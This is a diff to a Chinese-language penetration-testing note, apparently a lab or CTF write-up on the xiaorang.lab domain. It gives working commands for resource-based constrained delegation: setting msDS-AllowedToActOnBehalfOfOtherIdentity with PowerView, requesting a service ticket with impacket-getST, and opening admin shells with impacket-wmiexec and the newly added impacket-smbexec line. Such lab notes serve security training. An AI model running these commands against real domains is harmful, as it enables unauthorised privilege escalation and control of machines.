@@ -35,6 +35,9 @@ $A.GetBinaryForm($SDBytes, 0)
 Get-DomainComputer XR-0687 | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose
 # 查看是否配置成功
 Get-DomainComputer XR-0687 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+# 在/etc/hosts中配置IP域名的映射关系
+## 172.22.60.15 PC1.xiaorang.lab
 ```
 
 # 4.用 Test1 账户申请 XR-0687 机器上的CIFS服务的高权限票据。
@@ -46,6 +49,8 @@ proxychains4 impacket-getST xiaorang.lab/Test1\$:Test1234 -dc-ip 172.22.15.13 -s
 # 使用申请的票据获取XR-0687这台机器的本地管理员权限。
 export KRB5CCNAME=Administrator.ccache
 proxychains4 impacket-wmiexec -k xiaorang.lab/Administrator@XR-0687.xiaorang.lab -no-pass
+## 不填用户名好像也行
+proxychains4 impacket-smbexec -no-pass -k PC1.xiaorang.lab
 ```
 
 # 介绍
